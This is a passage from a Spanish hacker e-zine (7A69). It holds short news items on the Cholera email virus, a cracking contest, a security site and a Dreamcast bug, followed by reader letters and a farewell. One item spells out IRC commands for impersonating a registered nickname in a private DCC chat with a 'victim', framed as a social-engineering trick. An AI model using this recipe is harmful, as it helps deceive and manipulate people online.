-----------------{ Nace Cholera, un nuevo virus de GriYo }-------------------
-----------------------------------------------------------------------------

El conocido creador de virus espa¤ol GriYo, miembro del grupo de
investigacion virica 29A, ha dado a luz (como las mamas :P) a un nuevo
virus, Cholera, tambien conocido como win32.CTX esta programado en C y es un
complejo virus que se transmite via E-Mail utilizando un motor de correo
propio, por lo que no depende de aplicaciones que el infectado pueda tener
instaladas.

Este virus sorprende sobretodo por su velocidad de infeccion, pues es capaz
de infectar una red entera en cuestion de segundos. Asi pues cholera se trata
de un virus peligroso, aun que, como siempre su creador no viene con malas
intenciones y en el mail enviado deja simbolos evidentes de que se trata de
un virus... ¨Quien ejecutaria un programa que viene en un mail vacio en el
que lo unico que se puede leer es un ":)" en el asunto? Bueno, alguno abra...

Podeis echarle un vistazo a la web del popular creador de virus:

                            http://www.bi0.net


-----------------------------------------------------------------------------


-----------------------{ Peque¤o truco en el IRC }---------------------------
-----------------------------------------------------------------------------

Lo que aqui voy a contar es ya muy viejo (aun que parece que ultimamente se
ha puesto de moda), pero no por ello ha dejado de funcionar, y de echo no
deberia dejar de funcionar nunca...

Este truco es un buen complemento para practicar ingenieris social, ya que
podemos tener una conversacion privada con un nick registrado que no sea el
nuestro sin que el temido NiCK no eche del IRC (de echo no estaremos
conectados :P).

Para realizar este truco deberemos saber la IP de la persona con la que
queremos charlar, eso es facil de conseguir, basta con conectarse un momento
al IRC y poner /dns <nick de la victima>. Ahora ya sabemos su IP, por lo que
desconectamos del IRC, y sin vonler a conectar ponemos /nick <el nick por el
que nos queramos haer pasar> y seguidamente /dcc chan <ip de la victima>,
esto hara que le hagamos al nuestra victima una peticion de Chat privado por
IP, si este lo acepta estableceremos una conversacion privada con nuestra
victima con el nick que tengamos (este o no este registrado).

Aun asi debeis ir con cuidado ya que el otro puede ser capaz de ver tu IP
cuando acepta la peticion, sinembargo... ¨Quien se fija es eso?.

-----------------------------------------------------------------------------


-------------------------{ SET: Concurso de crack }--------------------------
-----------------------------------------------------------------------------

Los amantes del cracking ya pueden participar en un concurso de cracks que
Saqueadores Edicion Tecnica se ha encargado de organizar, se puede partizipar
individualmente o por colectivo, y para hacerlo basta con comunicarlo al
siguiente correo electronico:

                           garrulo@exterminator.net

Debido a que el crack es una practica ilegal, SET ha legalizado el concurso
haciendo que el programa a crackear sea el TRIVIAL HACKING, uno que ellos han
creado, y al que dan total permiso para modificarlo.

NOTA: Podeis encontrar mas informacion sobre este concurso en el numero 21
      de Saqueadores Edicion Tecnica (http://www.thepentagon.com/paseante).

Hay que agradecer a SET por tomar esta iniciativa, y esperar que en un
futuro se organicen cosas similares aqui en Espa¤a. ¨Quien se ve con animos
de montar un servidor y permitir que se haga sobre el cualquier cosa?  :P

-----------------------------------------------------------------------------


---------------------------{ NEW SECURITY SITE }-----------------------------
-----------------------------------------------------------------------------

No podiamos esperar menos de gente como Conde Vampiro. ¨Lo ultimo? Una nueva
Web de seguridad informatica llevada por los espa¤oles del proyecto w00ww00.

De momento podeis encontrar en su web librerias para el lenguaje CASL, un
lenguaje parecido al Shell Script C pero orientado a la seguridad. Y como no,
tambien podeis encontrar aplicaciones intresantes.

Roses Labs (nombre que recibe este proyecto) ha recibido ya felicitaciones de
empresas de seguridad, e ISPs... por algo sera.

La web en cuestion es....

                        http://www.roses-labs.com

Y que recomiendo su visita :)

NOTA: Si quereis mas informacion sobre Roses Labs podeis encontrarla en la
      seccion "about" de su website.

-----------------------------------------------------------------------------


--------------------------{ Bug en la DreamCast }----------------------------
-----------------------------------------------------------------------------

La DreamCast, esa popular consola que vuelve lelos a los ni¤os... VIVA EL
VICIO Y LELISLO!!! Yo no sabia nada hasta que lei en las noticias de SET que
esta consola tenia un peque¤o fallo (¨saldran los monstruitos de la pantalla
para comerse a los ni¤os?). El bug consiste en un exploit para el browser de
la consola que la cuelga immediatamente, la solucion del problema pasa por
una actualizacion del software. Podreis encontrar mas informacion en la
pagina oficial de SEGA (supongo que algo habra :P):

                            http://www.sega.com

-----------------------------------------------------------------------------


---------------------------{ Linux Kernel 2.4 }------------------------------
-----------------------------------------------------------------------------

No cabe duda de que Linux se enta imponiendo en internet al NT de microsoft,
y una vez mas Linux se adelanta a la empresa comercial sacando el kernel 2.4
antes que microsoft saque a la VENTA la que es por el momento la unica cosa
decente que han echo (aun que eso aun esta por ver), Widows2000.

Podreis conseguir mas informacion sobre el kernel 2.4 en:



Y bajarlo de:

               ftp://kirk.bond.edu.au/pub/OS/Linux/kernel


----------------------------------------------------------------------------


Si teneis alguna noticia interesante solo teneis que redactarla y enviarla a
7a69ezine@mixmail.com , asi que ya sabeis, a leer todos los boletines y
enterarse de todo para redactar las noticias mas importantes y mandarlas.

Asi nos ahorramos nosotros el tener que hacerlo :P





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º13.- La voz del lector        º      Mailing       º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Bueno, pues iniciamos hoy esta seccion. "La voz del lector" tratara de ser
una seccion en la que los lectores de 7A69 pueden espresar sus opiniones,
hacer recomendaciones y peticiones (incluso preguntas). La verdad es que no
nos podemos quejar de los E-Mails que hemos recibido.... desde aqui damos las
gracias a todos los que se han dignado a escribir..... y a todos aquellos que
nos leen y que no nos escriben :)



-{ 01 }----------------------------------------------------------------------

holas.
molan tus e-zines o como quieras llamarlo.
la verdad es que estan muy interesantes tus eso. si lo que quieres son 
e-mails para que puedas seguir haciendo los e-zines al menos ya tienes uno 
mas(yop)
pos eso mola la eso y sigue con ello.
bye

                      <Ripe: ¨mis eso?.... ah vale xD>



-{ 02 }----------------------------------------------------------------------

Muy buena la web seguid asi, os escribia 
porque al entrar con internet explorer hay errores de 
ejecución en la linea 136 de vuestra pagina no se si 
lo sabiais o esta preparada para netscape bueno 
saludos y esperamos vuestras siguientes andaduras

               <Ripe: Es posible, la web esta preparada para
                      Netscape.... Si tengo tiempo taratare
                      de mirarlo y arreglarlo.
                      Gracias por el aviso y el mail>

saludos de BranVaX



-{ 03 }----------------------------------------------------------------------

Bueno, pues sm, estoy escribiendo. La verdad sea dicha, mis conocimientos de
informatica no son  suficientes para hacerme merecedor, siquiera, del tmtulo
de "Novato". Vale, pues lo que yo quiero  saber si ese ofrecimiento de ayuda
que haces recurrentemente va dirigido tambien a personas como  yo, que no
tienen ni puta idea, pero sm muchas ganas de saber... lo digo, mas que nada,
para  empezar a bombardearte con preguntas. Por mi parte, poco puedo ofrecer
en lo que respecta a la  parte ticnica del asunto, pero si pudiera ofrecer
alguna ayuda de cualquier otro tipo, no tendrma  incoveniente alguno en
colaborar.

               <Ripe: En principio nosotros no respondemos
                     pregutas "personalizadas", pero nada te
                     priva de mandarlas :)
                     Por lo dela ayuda... en la seccion
                     proyectos puedes leer que necesitamos
                     gente que pase 7A69 a otros formatos>
                
Por lo pronto, ahm va la nueva frase que debes necesariamente  has
de incluir en el encabezamiento del e-zine, a riesgo de sufrir los azotes de
mi cslera (que no esta  mal, vaya): "Donde hay barra de choped, no manda
dodecaedro irregular", un aforismo que, sin  duda, expresa con clarividencia
la controversia que en este fin de milenio suscita este bendito medio  que es
Internet y !  que a nosotros, como usuarios y tambiin como ciudadanos, nos
concierne mas de lo que muchos  incautos pueden imaginar.


                <Ripe: mmm, apuntada queda.... para proximos
                     numeros>

Si tardo en contestar es porque en el Hospital Psiquiatrico de Nuestra Seqora del Portaaviones sslo
nos dejan utilizar el ordenador el zltimo domingo de cada mes.

              <Ripe: ¨¨¨??? bueno en todo caso, que te mejores>

Saludos.



-{ 04 }----------------------------------------------------------------------

Hola Ripe, he leido algunos de tus articulos y creo que son muy interesantes,
me parece muy  bien que intentes, con eso, ayudar o aconsejar a personas que
como yo no sabemos mucho del  tema, pero nos gustaria aprendrer.
Me despido esperando que sigas escribiendo y dejando tus articulos en la red.

             <Ripe: Gracias por los animos trataremos de seguir>



-{ 05 }----------------------------------------------------------------------

HOLA RIPE SOY MARIANO TENGO 25 AÑOS(SHAOLIN es mi nick)VIVO
EN ARGENTINA Y ME PASARON LA DIRECCION DE
TU PAGINA EL OTRO DIA EN EL CHAT DEL IRC.HISPANO.
JUSTO EN ESTE MOMENTO ESTABA LEYENDO TUS NOTAS Y TE DIJO QUE 
ME INTERESAN MUCHO.
ESTAN MUY BIEN REDACTADAS Y FACIL DE ENTENDER.
ES BUENO ENCONTRAR GENTE QUE SEPA DEL TEMA.
YO SOY PRINCIPIANTE EN ESTO Y ESTOS MANUALES ME SIRVEN MUCHO.
BUENO COMO DECIS QUE NO RECIBISTE NINGUN MAIL ACA VA ESTE 
DESDE ARGENTINA, JEJEEEJEEEJEE
TE COMENTO QUE AQUI ESTAMOS HACIENTO CON UN PAR DE AMIGOS UNA 
PAGINA 
PARA AYUDAR A LA GENTE DEL CHAT.
(http://200.0.237.228/personales/Personales/tulugar/index.html
visitala y comentame que te parece!!!)

              <Ripe: La web continua sin funcionar... :-?>        

NOSE COMO SERA EN ESPAÑA PERO ACA LAS COSAS ESTAN DIFICILES.
TRATAMOS DE FORMAR UN CLAN PARA PEDIR A LAS TELEFONICAS UN 
COSTO FIJO DE LLAMADAS
COMO PUEDE SER 30$ POR BIMESTRE PARA QUE TODOS PUEDAN TENER 
ACCESO AL CHAT Y A LA WEB.
(EL SERVIDOR EN EL QUE ESTAMOS ES IRC.SATLINK.COM EL CANAL 
HACKERS) 
QUIZA ALGUN DIA PUEDAS DARTE UN PASEO POR ACA, NO HAY TANTOS 
CANALES COMO EN EL HISPANO PERO BUE 
RECIEN EMPIEZA JEJJEEEJEE.

             <Ripe: Ya me he pasado.... no habia ni diox xD>
        
BUENO RIPE ESPERO QUE TE LLEGE MI MAIL Y SI PODES ESPERO TU
RESPUESTA Y PODER ESTAR CONECTADOS.
CUANDO TENGAS MAS TEXTOS COMO ESTE POR FAVOR MANDAMELOS :)

             <Ripe: Ya te lo dije, pasa por la web y te lo
                    bajas, que ahi estara ;)>
           
UN ABRAZO SHAOLIN mi mail es xxxxxxx@xxxxxxxxxx



-{ 06 }----------------------------------------------------------------------

Re!!!! Estoy aprendiendo poco a poco como Hack me estoy tragando todas tus
publicaciones aun ke
la seccion de virus me sienta como una patada.

        <Ripe: jeje, eso el |CoDeX|, que lo escribio XD>

Poco a poco intento aprenderde aqui y de alla y en esas inagaciones encontre
tu pagina y me vaje tu guia; Me parecen buenas me enseñan y apoyo tus
principios. ya he utilizado alguna cosa de tu guias (La ingenieria social por
ejemplo).

        <Ripe: Encantado de ser util, jeje>

Solo era eso pero bueno yo prefiero aprender a base de colegas que encuentro
en algunos canales
como #hacker y #hacking (aun siendo novato y llebarme algun ban a causa de
que me llamen larmer
pero bueno si quieres decirme algo mi nik es Desolado Ok espero ke sigas
escriviendo. bueno asta otra.

        <Ripe: Creo no haberte visto nunca :P>


-----------------------------------------------------------------------------

Gracias a todos los que habeis escrito (¨en plural? :P) y seguid haciendolo,
que 7A69 no es nada si TI que estas en el otro lado lellendo y pensando...
"He de escribirles para comentarles esto" :)

Bueno haber si hay mas suerte para el proximo numero. Y recordad que buscamos
colaboradores.

NOTA: Apartir de ahora mandad los mensages, articulos, etc. al E-Mail
      oficial:

                            7a69ezine@mixmail.com

      ­Gracias!






ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º14.- Despedida                º   Un numero mas    º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Pues una vez mas (y ya van siete) hemos de decir adios, aun que no sin antes
saludar:

                                  -A SET

                           -A JJF / Hackers Team

                               -A Netsearch

                     -Gente de #hacker_novatos y #Delta


Un saludo especia a ScsiX, que se ha ido "nosedonde" a hacer "noseque".... A
ver cuando vuelves ;)



Bye y.....


               ­­­­­­­­­­­­­­FELIZ NAVIDAD A TODOS!!!!!!!!!!!!!!

                                       Y

                               PROSPERO ANO NUEVO

                                     ¨Ano?


                             [ Dibujo de navidad ]


           <Ripe: Lo mio no es dise¤ar dibujitos ASCII, asi que
                  el dibujo hazlo tu :P>


NOTA FINAL: Espero que haya quedado claro que apartir de ahora queremos que
            los articulos, peticiones, proyectos, sugerencias (en definitiva
            mails dirigidos a {7A69}) sean mandados a 7a69ezine@mixmail.com



#############################################################################
# NOTA: 7A69 es un E-Zine abierto, por lo que cualquira que quiera          #
#       colavorar con algun articulo solo tiene que mandarlo a:             #
#                                                                           #
#                          7a69ezine@mixmail.com                            #
#                                                                           #
#       Se eperan especialmente articulos relacionados con el crack y       #
#       la telefonia, juer, a ver si se anima alguien que estamos           #
#       necesitdillos ;)                                                    #
#############################################################################

-----------------------------------------------------------------------------
                   Eso... eso... eso es todo.... amigos
-----------------------------------------------------------------------------

